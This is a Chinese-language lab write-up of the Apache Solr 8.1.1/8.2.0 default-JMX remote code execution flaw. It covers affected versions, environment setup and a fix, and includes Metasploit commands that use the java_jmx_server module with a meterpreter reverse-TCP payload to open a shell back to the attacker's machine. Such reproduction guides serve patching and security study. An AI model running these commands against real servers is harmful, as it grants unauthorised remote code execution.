## **0x00简介**

Solr是一个独立的企业级搜索应用服务器，它对外提供类似于Web-service的API接口。用户可以通过http请求，向搜索引擎服务器提交一定格式的XML文件，生成索引；也可以通过Http
Get操作提出查找请求，并得到XML格式的返回结果。

该漏洞源于默认配置文件solr.in.sh中的ENABLE_REMOTE_JMX_OPTS配置选项存在安全风险。

Apache Solr的8.1.1和8.2.0版本的自带配置文件solr.in.sh中存在ENABLE_REMOTE_JMX_OPTS="true"选项。

如果使用受影响版本中的默认solr.in.sh文件，那么将启用JMX监视并将其暴露在RMI_PORT上（默认值= 18983），

并且无需进行任何身份验证。 如果防火墙中的入站流量打开了此端口，则具有Solr节点网络访问权限的任何人都将能够访问JMX，

并且可以上传恶意代码在Solr服务器上执行。该漏洞不影响Windows系统的用户,仅影响部分版本的Linux用户。

## **0x01影响版本**

Apache Solr8.1.1版本上线时间：2019-05-28

Apache Solr8.2.0版本上线时间：2019-07-25

## **0x02漏洞危害**

如果受害者使用了该默认配置，则会在默认端口18983开放JMX服务，且默认未开启认证。任何可访问此端口的攻击者可利用此漏洞向受影响服务发起攻击，执行任意代码。

## **0x03环境搭建**

Java环境和kali系统、Solr 8.20

Solr 8.20 下载地址：

wget http://archive.apache.org/dist/lucene/solr/8.2.0/solr-8.2.0.zip

![](https://image.3001.net/images/20200813/1597289861.png!small)

使用unzip solr-8.2.0.zip解压

![](https://image.3001.net/images/20200813/1597289846.png!small)

解压完成后，切换到bin目录启动Solr

./solr start -force

![](https://image.3001.net/images/20200813/1597289825.png!small)

启动后访问：http://192.168.10.176:8983/

![](https://image.3001.net/images/20200813/1597289808.png!small)

## **0x04漏洞复现**

攻击机：kali IP：192.168.10.147

受害机：Ubuntu18.6中docker IP：192.168.10.184:8983

1、使用nmap扫描端口后发现18983端口开启

![](https://image.3001.net/images/20200813/1597289750.png!small)

2、使用Metasploit中的exploit/multi/misc/java_jmx_server模块进行漏洞复现

Ø use exploit/multi/misc/java_jmx_server

Ø set RHOST 192.168.10.184

Ø set RPORT 18983

![](https://image.3001.net/images/20200813/1597289732.png!small)

再来设置payload：java/meterpreter/reverse_tcp

Ø set payload java/meterpreter/reverse_tcp

Ø set LHOST 192.168.10.147

Ø set LPORT 4444

![](https://image.3001.net/images/20200813/1597289722.png!small)

3、使用run执行，即可看到成功建立连接

![](https://image.3001.net/images/20200813/1597289710.png!small)

## **0x05修复建议**

将solr.in.sh配置文件中的ENABLE_REMOTE_JMX_OPTS选项设置为false，然后重启Solr服务。

